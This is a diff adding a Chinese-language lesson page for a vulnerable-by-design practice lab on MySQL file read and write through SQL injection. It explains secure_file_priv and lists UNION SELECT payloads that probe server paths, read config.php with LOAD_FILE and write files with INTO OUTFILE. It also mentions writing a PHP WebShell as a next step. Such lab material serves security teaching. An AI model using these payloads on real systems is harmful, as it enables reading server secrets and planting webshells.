@@ -1,0 +1,85 @@
+<h4>先搞懂：MySQL 文件读写权限（secure_file_priv）</h4>
+<p><code>secure_file_priv</code> 是 MySQL 的全局只读变量，用来限定 <code>LOAD_FILE()</code>、<code>INTO OUTFILE</code>、<code>LOAD DATA INFILE</code> 能操作哪些文件路径。它只能在配置文件里改：Windows 是 <code>my.ini</code>，Linux 是 <code>my.cnf</code>（或 <code>/etc/mysql/my.cnf</code>）；MySQL 5.7 及以上不支持用 <code>SET GLOBAL</code> 动态修改，改完必须重启 MySQL 才生效。</p>
+<table class="chk-table">
+<tr><th>配置写法</th><th>实际效果</th><th>攻击者视角</th></tr>
+<tr><td><code>secure-file-priv=""</code></td><td>显式空字符串：不限制目录，MySQL 进程可访问的任意路径都能读写</td><td>风险最高。只要存在注入点且账号有 <code>FILE</code> 权限，就能写 WebShell、读任意配置文件</td></tr>
+<tr><td><code>secure-file-priv=</code><br>（等号后留空）</td><td>选项存在但值为空，按空字符串处理，效果同上。<b>但「整行不写 / 注释掉」不等于留空</b>：未设置时使用当前版本的默认值——5.6 默认空（不限），5.7.6 及以上默认 NULL（禁止），必须以实测值为准</td><td>不要只看配置文件就下结论，先用下面的查询确认实际返回值，再决定能否写文件</td></tr>
+<tr><td><code>secure-file-priv=具体目录</code><br>（如 <code>D:/mysql-files</code>）</td><td>只允许该目录及其子目录读写，其他路径返回错误码 1290</td><td>这是唯一可写目录；重点确认它是否在 Web 根下、能否被浏览器访问（写 WebShell 的前提）</td></tr>
+<tr><td><code>secure-file-priv=NULL</code></td><td>完全禁止 <code>LOAD_FILE</code> / <code>INTO OUTFILE</code> / <code>LOAD DATA</code>，相关语句直接失败</td><td>文件读写这条路走不通，只能回到纯数据读取（UNION / 报错 / 盲注）</td></tr>
+</table>
+<p>查看当前实际值（两条语句等价）：</p>
+<pre>
+SHOW VARIABLES LIKE 'secure_file_priv';
+SELECT @@secure_file_priv;
+</pre>
+<p>返回结果怎么读：<b>值是一片空白</b> → 空字符串，不限制；<b>显示 NULL</b>（SQL 的 NULL，不是字符串 "NULL"）→ 文件读写已禁用；<b>显示某个目录</b> → 只允许该目录。建议同时执行 <code>SELECT @@version;</code>，结合版本判断「未设置」时的默认行为。</p>
+<p><b>本靶场安装时会把 <code>secure_file_priv</code> 指向本关的 <code>files</code> 目录</b>，只放开教学所需的一个目录，其余路径仍会报 1290；这是有意保留的最小权限配置，不是漏洞修复。</p>
+
+<h4>漏洞描述</h4>
+<p>SQL 注入不仅能读数据，还能借数据库的文件读写能力向服务器写文件。当 MySQL 账号拥有 <code>FILE</code> 权限、且 <code>secure_file_priv</code> 允许目标目录时，攻击者可以把 <code>UNION SELECT</code> 的查询结果通过 <code>INTO OUTFILE</code> 落地成文件，再通过 Web 访问该文件，形成「注入 → 写文件 → 访问 / Getshell」的完整利用链。</p>
+<p>本关沿用数字型注入点 <code>WHERE id = $id</code>，查询固定返回 4 列（<code>id, username, email, role</code>），需要按 4 列构造 <code>UNION SELECT</code>。</p>
+
+<h4>利用链：从注入点到文件落地</h4>
+<ul>
+<li>① 确认注入与列数：<code>order by 4</code> 正常、<code>order by 5</code> 报错 → 4 列。</li>
+<li>② 确认文件能力：读取 <code>@@secure_file_priv</code>、<code>@@datadir</code>、<code>@@basedir</code>、<code>@@version_compile_os</code>。</li>
+<li>③ 选目标路径：必须在 <code>secure_file_priv</code> 指定目录内，且数据库进程对该目录有写权限。</li>
+<li>④ 写入文件：<code>UNION SELECT ... INTO OUTFILE '路径'</code>。</li>
+<li>⑤ 回读验证：浏览器访问文件，或注入 <code>LOAD_FILE('路径')</code> 读取。</li>
+<li>⑥ 进阶利用：写入 <code>shell.php</code> 获取 WebShell，或写一个无法直接访问的 flag / 配置副本。</li>
+</ul>
+
+<h4>可写路径判定（常用信息收集 payload）</h4>
+<pre>
+# 操作系统类型：Win64 表示 Windows，否则多为 Linux
+?id=-1 UNION SELECT 1,@@version_compile_os,3,4
+
+# 数据目录 / 安装目录（常用来推测可写子目录）
+?id=-1 UNION SELECT 1,@@datadir,@@basedir,@@version
+
+# 当前数据库名（写文件时经常顺手放进内容里验证）
+?id=-1 UNION SELECT 1,database(),user(),4
+
+# 文件读写白名单目录：NULL 表示禁止；空字符串表示不限制；其他值为唯一允许目录
+?id=-1 UNION SELECT 1,@@secure_file_priv,3,4
+
+# 读取文件（成功返回内容，失败返回 NULL）
+?id=-1 UNION SELECT 1,LOAD_FILE('{{BASE_DIR}}/config.php'),3,4
+
+# 用 HEX 读取，避免换行/二进制/编码问题导致内容显示不全
+?id=-1 UNION SELECT 1,HEX(LOAD_FILE('{{BASE_DIR}}/config.php')),3,4
+</pre>
+<p>注意：<code>@@secure_file_priv</code> 返回 <b>NULL</b> 表示文件读写已禁用，返回空字符串表示不限制，返回目录名表示只允许该目录；写 payload 前先确认属于哪一种。</p>
+
+<h4>写入 flag 文件（本关通关 payload）</h4>
+<pre>
+# 反斜杠路径：MySQL 字符串中 \ 是转义符，必须写双反斜杠
+?id=-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 INTO OUTFILE '安装路径\\modules\\sqli\\files\\flag.txt'
+
+# 正斜杠路径（推荐，Windows / Linux 都可用，不需要转义；{{BASE_DIR}} 会自动替换为当前部署路径）
+?id=-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 INTO OUTFILE '{{BASE_DIR}}/modules/sqli/files/flag.txt'
+</pre>
+<p>第一条示例中的「安装路径」要替换为你本机的真实部署路径（如 <code>D:/phpStudy/WWW/bafanglab</code>），否则写入位置会不同；路径长度与盘符按自己的环境填写。</p>
+<p>写入成功后，文件内容为 4 列以制表符分隔的一行：<code>1&nbsp;&nbsp;恭喜你完成本关挑战！&nbsp;&nbsp;3&nbsp;&nbsp;4</code>。本关的读取同样走注入：在页面「读取」框提交 <code>LOAD_FILE()</code> payload（见下文「读取文件」示例），由数据库把文件内容读回结果表格；页面本身不会直接读取文件，读回内容与写入一致即通关。直接访问 <a href="{{BASE}}/modules/sqli/files/flag.txt" target="_blank" rel="noopener noreferrer">{{BASE}}/modules/sqli/files/flag.txt</a> 只用于对照确认文件确实落地。</p>
+
+<h4>Windows 路径写法与斜杠转义</h4>
+<ul>
+<li><b>正斜杠</b>：<code>'安装路径/modules/sqli/files/flag.txt'</code>，无需转义，最稳妥。</li>
+<li><b>双反斜杠</b>：<code>'安装路径\\modules\\sqli\\files\\flag.txt'</code>，单写一个反斜杠会把 <code>\m</code>、<code>\f</code> 等当作转义序列，路径直接损坏。</li>
+<li><b>URL 编码</b>：payload 放在 GET 参数里时，空格、<code>'</code>、<code>\</code> 建议 URL 编码，例如 <code>%27</code>、<code>%5C%5C</code>、<code>%20</code>。</li>
+<li><b>目录必须已存在</b>：<code>INTO OUTFILE</code> 不能自动创建目录，本关的 <code>files/</code> 目录已由安装程序创建。</li>
+<li><b>不能覆盖</b>：目标文件已存在会报错误码 1086，需先删除或换文件名。</li>
+</ul>
+
+<h4>常见失败原因</h4>
+<ul>
+<li><b>secure_file_priv 限制</b>：值为 NULL → 完全禁止；值为某个目录 → 只能读写该目录；与目标路径不一致就会报 1290。</li>
+<li><b>缺少 FILE 权限</b>：数据库账号未被授予 <code>FILE</code>，报 1044 / 1142。</li>
+<li><b>目录不可写</b>：MySQL 服务进程（Windows 下可能是 SYSTEM 或 phpStudy 账号）对目标目录没有写权限。</li>
+<li><b>路径转义错误</b>：反斜杠未双写、路径中含单引号未闭合，导致语法错误。</li>
+<li><b>文件已存在</b>：<code>INTO OUTFILE</code> 不做覆盖，报 1086。</li>
+<li><b>写到了 Web 无法访问的位置</b>：文件写成功但目录不在站点根目录下，浏览器无法直接访问（可改用 <code>LOAD_FILE</code> 回读）。</li>
+</ul>
+
+<h4>延伸练习</h4>
+<p>更系统的 SQL 注入练习可安装 sqli-labs：<a href="https://github.com/skyblueee/sqli-labs-php7" target="_blank" rel="noopener noreferrer">https://github.com/skyblueee/sqli-labs-php7</a></p>
